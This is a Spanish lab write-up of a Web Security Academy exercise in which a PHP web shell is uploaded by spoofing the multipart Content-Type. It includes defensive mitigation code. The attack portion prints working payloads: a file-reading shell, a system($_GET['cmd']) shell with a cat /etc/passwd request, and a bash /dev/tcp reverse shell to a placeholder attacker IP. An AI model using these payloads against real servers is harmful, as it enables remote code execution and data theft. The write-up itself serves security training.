---
title: "Lab: Web shell upload via Content-Type restriction bypass"
date: 2026-06-02
category: "File Upload"
order: 4
tags: ["web-security-academy", "file-upload", "lab", "rce"]
layout: layouts/writeup.njk
permalink: /writeups/file-upload-lab-content-type-bypass.html
---

## Descripción de la vulnerabilidad

Esta es una variante de File Upload donde el servidor **sí tiene una defensa**, pero es superficial: valida el `Content-Type` del archivo subido y solo acepta `image/jpeg` o `image/png`. Sin embargo, el problema es que **confía ciegamente en lo que el cliente declara** como tipo de archivo, sin verificar que el contenido real sea efectivamente una imagen.

Esto significa que el atacante puede subir un archivo `.php` malicioso simplemente **mintiendo en el header Content-Type** dentro del multipart — diciéndole al servidor que es una imagen cuando en realidad es código PHP.

---

## Reconocimiento

Al igual que en el lab anterior, se identificó el campo de subida de avatar en **My Account**. Se intentó subir directamente el web shell `BasicWebShell.php` sin modificar nada, y el servidor respondió:

```
HTTP/2 403 Forbidden
Sorry, file type application/octet-stream is not allowed
Only image/jpeg and image/png are allowed
```

Esto confirmó que **existe una validación**, pero también reveló exactamente qué está validando: el `Content-Type` del archivo dentro del multipart. El servidor no menciona nada sobre la extensión del archivo ni su contenido real.

---

## Ataque

### Paso 1 — Subir el web shell con Content-Type incorrecto (bloqueado)

Request interceptada con Burp al subir `BasicWebShell.php`:

```
------geckoformboundary...
Content-Disposition: form-data; name="avatar"; filename="BasicWebShell.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Resultado:** `403 Forbidden` — el servidor rechazó `application/octet-stream`.

### Paso 2 — Cambiar el Content-Type dentro del multipart (bypass)

En Burp Repeater se modificó únicamente el `Content-Type` de la parte del archivo, cambiándolo a `image/jpeg`:

```
------geckoformboundary...
Content-Disposition: form-data; name="avatar"; filename="BasicWebShell.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Resultado:** `200 OK`

```
The file avatars/BasicWebShell.php has been uploaded.
```

El servidor aceptó el archivo porque el Content-Type declarado era `image/jpeg`, sin verificar que el contenido real fuera una imagen.

### Paso 3 — Encontrar la ruta del archivo

Se inspeccionó el código fuente de `/my-account` y se encontró la ruta directamente en el tag del avatar:

```html
<img src="/files/avatars/BasicWebShell.php" class=avatar>
```

### Paso 4 — Ejecutar el web shell

```
GET /files/avatars/BasicWebShell.php HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

**Resultado:** el servidor ejecutó el PHP y devolvió el secreto en el body de la respuesta:

```
5Dc0atS8A1XxMFPdaxVIGrDYxSKVb8TV
```

---

## Por qué funcionó

El servidor cometió un error clásico: **validar lo que el cliente declara en lugar de verificar el contenido real del archivo**.

El flujo del ataque en una sola línea: el servidor lee `Content-Type: image/jpeg` → lo acepta → guarda el archivo con extensión `.php` → Apache lo ejecuta cuando se accede vía HTTP.

La validación correcta hubiera sido inspeccionar los **magic bytes** del archivo (los primeros bytes del contenido que identifican el tipo real), o forzar que la extensión del archivo coincida con el tipo MIME declarado.

---

## Cómo identificarlo en blackbox

1. Subir un archivo `.php` con Content-Type real (`application/octet-stream`) y observar la respuesta — si el servidor lo rechaza con un mensaje que menciona el tipo MIME, la validación es por Content-Type.
2. Interceptar la request con Burp y cambiar el `Content-Type` de la parte del archivo a `image/jpeg` o `image/png`.
3. Si el servidor acepta el archivo, verificar si es accesible públicamente e intentar ejecutarlo.

### Diferencia clave vs el lab anterior

<table>
<tr><td>Lab</td><td>Validación</td><td>Bypass</td></tr>
<tr><td>Remote code execution via web shell upload</td><td>Ninguna</td><td>No necesario</td></tr>
<tr><td>Content-Type restriction bypass</td><td>Valida Content-Type del multipart</td><td>Cambiar a <code>image/jpeg</code> en Burp</td></tr>
</table>

---

## Impacto

Idéntico al lab anterior — RCE completo. La "defensa" por Content-Type no aporta seguridad real porque ese valor es completamente controlado por el cliente y puede ser modificado con cualquier proxy como Burp Suite.

---

## Preguntas frecuentes

**¿Por qué había dos Content-Type en el request?**

Porque el request usa el formato `multipart/form-data`, que permite enviar múltiples partes en un solo request, cada una con sus propios headers. Hay dos niveles: `Content-Type: multipart/form-data; boundary=...` (header del request completo) y `Content-Type: image/jpeg` (header de la parte específica del archivo, este es el que valida el servidor). Son distintos y cumplen roles diferentes.

**¿El request multipart son como dos requests dentro de uno?**

No, es un solo request HTTP. El body está dividido en partes separadas por un `boundary` (separador). Es como un sobre con varios documentos adentro — cada parte tiene sus propios mini-headers (`Content-Disposition`, `Content-Type`), pero todo viaja en un solo request.

**¿Por qué cambiar el Content-Type y no la extensión del archivo?**

Porque el mensaje de error lo indicó explícitamente: *"Only image/jpeg and image/png are allowed"*. Está rechazando por **file type** (Content-Type), no por extensión. Si hubiera validado por extensión, el error hubiera dicho algo como *"Only .jpg and .png are allowed"*. Los mensajes de error son la principal fuente de información para saber qué está validando el servidor.

**¿Y si hubiera cambiado la extensión a `payload.php.jpg`?**

Eso es un bypass de validación por extensión — una defensa diferente. En este lab el servidor no valida la extensión, entonces cambiarla no era necesario ni hubiera resuelto este filtro.

**¿Por qué el contenido del PHP se ve en texto plano dentro del request?**

Porque un archivo `.php` es texto plano — su contenido son simplemente caracteres de texto. El browser lo incluye en el body tal como está. En cambio, si se sube una imagen real (`.png`), en ese mismo lugar aparecerían bytes binarios ilegibles.

---

## Mitigación

El servidor nunca debe confiar en el `Content-Type` que declara el cliente, porque ese valor es completamente controlado por el atacante y puede ser modificado con cualquier proxy como Burp Suite. La defensa correcta incluye:

**Verificar los magic bytes** del archivo:

```python
def is_png(file_bytes):
    return file_bytes[:8] == b'\x89PNG\r\n\x1a\n'

with open(uploaded_file, 'rb') as f:
    header = f.read(8)

if not is_png(header):
    reject("No es PNG real")
```

**Usar librerías del lado del servidor** que analicen el contenido real del archivo:

```python
import magic
mime = magic.from_file(uploaded_file, mime=True)
# Devuelve 'image/jpeg' basado en el contenido, no en el header
if mime not in ['image/jpeg', 'image/png']:
    reject()
```

**Renombrar el archivo al guardarlo** con una extensión segura controlada por el servidor:

```python
import uuid
safe_name = str(uuid.uuid4()) + '.jpg'  # extensión forzada por el servidor
save_path = '/uploads/' + safe_name
```

**Guardar los archivos fuera del webroot:**

```
/var/www/html/          ← webroot, accesible via HTTP
/var/uploads/           ← fuera del webroot, NO accesible via HTTP
```

El servidor guarda en `/var/uploads/` y cuando necesita servir el archivo, lo lee internamente y lo devuelve como response — el usuario nunca accede directamente a la ruta del archivo.

**Configurar el servidor para no ejecutar scripts** en el directorio de uploads:

```
<Directory /var/www/html/files/avatars>
    php_flag engine off
    AddType text/plain .php .php5 .phtml
</Directory>
```

Aunque alguien suba y acceda a un `.php`, Apache lo sirve como texto plano en lugar de ejecutarlo.

> La defensa real combina varios de estos — ninguno por sí solo es suficiente.

---

## ¿Por qué el browser asigna `application/octet-stream`?

Cuando se sube un archivo desde el browser, este intenta detectar el tipo de archivo automáticamente para asignarle un Content-Type. Para archivos conocidos como `.jpg` o `.png`, el browser los reconoce y asigna `image/jpeg` o `image/png`.

Para archivos que el browser no reconoce — como `.php` — asigna `application/octet-stream`, el tipo genérico que significa "secuencia de bytes desconocida". Por eso el primer intento fue rechazado: el browser vio `.php`, no lo reconoció como imagen, y le asignó `application/octet-stream` automáticamente.

El bypass consistió en mentirle al servidor cambiando ese valor manualmente a `image/jpeg` en Burp — algo que el browser nunca haría por su cuenta.

**¿Quién asigna el MIME type?** El **browser** lo asigna automáticamente al construir el request. El servidor no asigna el MIME type del request — lo recibe y lo lee para validarlo. Lo que el servidor sí asigna es el Content-Type de su **respuesta** cuando devuelve un archivo al cliente.

---

## Más allá de la flag — Shell interactiva

El web shell usado en este lab (`<?php echo file_get_contents(...); ?>`) es el mínimo necesario para extraer la flag. Pero como el servidor no tiene ninguna validación, cualquier PHP funciona.

**Web shell con ejecución de comandos:**

```php
<?php system($_GET['cmd']); ?>
```

```
GET /files/avatars/shell.php?cmd=whoami
GET /files/avatars/shell.php?cmd=ls+-la
GET /files/avatars/shell.php?cmd=cat+/etc/passwd
```

**Reverse shell interactiva:** para obtener una shell interactiva real (con TTY, historial, autocompletado), se usaría el web shell para ejecutar un comando que establezca una conexión hacia la máquina del atacante:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'"); ?>
```

El atacante escucha con netcat:

```bash
nc -lvnp 4444
```

Y obtiene una shell interactiva completa en el servidor.

**Limitación en labs de PortSwigger:** los servidores de los labs necesitan poder alcanzar la IP del atacante. Para esto se requiere una IP pública con puerto abierto (VPS) o usar **Burp Collaborator**, que ya provee esa infraestructura. Sin eso, la reverse shell no llega.
